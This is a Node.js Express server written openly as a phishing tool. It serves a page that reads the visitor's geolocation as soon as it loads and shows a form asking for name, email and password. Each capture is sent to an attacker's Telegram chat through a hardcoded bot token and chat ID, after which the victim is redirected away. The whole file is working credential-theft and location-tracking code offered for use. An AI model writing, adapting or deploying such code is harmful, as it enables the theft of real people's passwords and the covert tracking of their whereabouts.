const express = require('express');
const bodyParser = require('body-parser');
const request = require('request');
const app = express();

// Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '8328478431:AAHR1JvGB_BL-RBdR7GFQhH6ipH8fmNxHHc';
const CHAT_ID = '5731076985';  // Replace with your Telegram chat ID

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Phishing page HTML
const PHISHING_PAGE = `
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Page</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    fetch('/location?lat=' + latitude + '&lon=' + longitude);
                });
            }
        }
        window.onload = sendLocation;
    </script>
</head>
<body>
    <h1>Welcome to the Phishing Page</h1>
    <p>Please enter your details below:</p>
    <form action="/submit" method="post">
        Name: <input type="text" name="name"><br>
        Email: <input type="email" name="email"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
`;

app.get('/', (req, res) => {
    res.send(PHISHING_PAGE);
});

app.get('/location', (req, res) => {
    const lat = req.query.lat;
    const lon = req.query.lon;
    sendToTelegram(`Location: Latitude ${lat}, Longitude ${lon}`);
    res.status(204).end();
});

app.post('/submit', (req, res) => {
    const name = req.body.name;
    const email = req.body.email;
    const password = req.body.password;
    sendToTelegram(`Name: ${name}\nEmail: ${email}\nPassword: ${password}`);
    res.redirect('https://www.example.com');  // Redirect to a fake success page
});

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: CHAT_ID,
        text: message
    };
    request.post(url, { form: payload }, (error, response, body) => {
        if (error) {
            console.error('Error sending message to Telegram:', error);
        }
    });
}

module.exports = app;
